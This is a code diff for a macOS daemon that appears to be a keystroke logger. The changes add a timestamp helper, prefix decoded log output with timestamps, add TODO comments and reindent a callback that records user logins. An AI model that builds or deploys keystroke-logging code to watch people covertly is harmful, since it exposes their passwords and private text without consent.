@@ -233,6 +233,7 @@ void DaemonTimerCallback( CFRunLoopTimerRef timer, void *info )
 	if (!keys)			// no keyboards logged
 		return;
 
+	// WHAT DOES THIS DO?
 	if (buffsize < MAX_BUFF_SIZE/10)
 		return;
 
@@ -458,6 +459,19 @@ bool outOfSpace(CFStringRef path)
 	return false;
 }
 
+CFStringRef get_timestamp(void)
+{
+	time_t the_time;
+	char timeBuf[32]={0};
+	time(&the_time);
+	ctime_r(&the_time, timeBuf);
+	char* newlin=strchr(timeBuf, '\n');
+	if (newlin)
+		*newlin=0;
+	// TODO: this sould be an epoch
+	CFStringRef stamp = CFStringCreateWithFormat(kCFAllocatorDefault,NULL,CFSTR("\n<%s>"),timeBuf);
+	return stamp;
+}
 void stamp_file(CFStringRef inStamp)
 {
 	time_t the_time;
@@ -493,6 +507,7 @@ void write_buffer(CFStringRef inData)
 	int buff_pos = 0;
 	while (1)
 	{	
+		// TODO: read off the timestamp
 		int avail_space =	8-CFDataGetLength(encrypt_buffer);					//space rem in buffer
 		int rem_to_copy =	CFStringGetLength(inData)-buff_pos;					//stuff in data that needs to be copied
 		int to_copy =		rem_to_copy<avail_space?rem_to_copy:avail_space;	//amount left to encryp, or avail space
@@ -627,8 +642,15 @@ CFStringRef getBuffer()
 	CFLocaleRef localCopy = CFLocaleCopyCurrent();
 	CFNumberFormatterRef myNF = CFNumberFormatterCreate(kCFAllocatorDefault,localCopy,kCFNumberFormatterNoStyle);
 	
+	// TODO: switch to use the timestamp from the buffer inside the loop
+	// prefix decodedData with a timestamp
+	CFStringRef timestamp = get_timestamp();
+	CFStringAppend(decodedData,timestamp);
+	CFRelease(timestamp);
+	
 	for (int i=0; i<CFDataGetLength(result);i+=2)
 	{
+		// TODO: first part on the buffer is a double w/ timestamp in it
 		u_int16_t curChar;
 		CFDataGetBytes(result,CFRangeMake(i,2),(UInt8*)&curChar);
 		bool isUpper = false;
@@ -689,9 +711,9 @@ void LoginLogoutCallBackFunction(SCDynamicStoreRef store, CFArrayRef changedKeys
     consoleUserName = SCDynamicStoreCopyConsoleUser(store, NULL, NULL);
     if (consoleUserName != NULL)
     {
-		CFStringRef sRef = CFStringCreateWithFormat(NULL, NULL, CFSTR("User '%@' has logged in"), consoleUserName);
-		stamp_file(sRef);
-		CFRelease(sRef);
+        CFStringRef sRef = CFStringCreateWithFormat(NULL, NULL, CFSTR("User '%@' has logged in"), consoleUserName);
+        stamp_file(sRef);
+        CFRelease(sRef);
         CFRelease(consoleUserName);
     }
 }
